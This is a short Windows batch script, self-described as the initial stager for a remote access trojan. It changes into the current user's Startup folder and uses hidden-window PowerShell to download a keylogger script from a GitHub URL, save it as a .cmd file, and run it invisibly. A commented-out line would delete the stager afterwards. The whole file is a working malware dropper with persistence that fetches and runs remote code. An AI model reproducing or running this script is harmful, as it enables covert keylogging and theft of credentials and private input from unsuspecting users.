@REM initial stager for RAT
@REM created by : Reihtw

@REM variables
set INITIALPATH=%cd%
set STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup

@REM move into startup folder
cd %STARTUP%

@REM write payloads to startup folder
powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/PrettyBoyCosmo/MK01-OnlyRAT/7fcc0b3ddbd87445f4b09ac4a6ef117a027f8973/resources/keylogger-pwsh/keylogger.ps1' -OutFile 'wget.cmd'"

powershell Start-Process powershell.exe -windowstyle hidden "./wget.cmd"


cd %INITIALPATH%
@REM del initial.cmd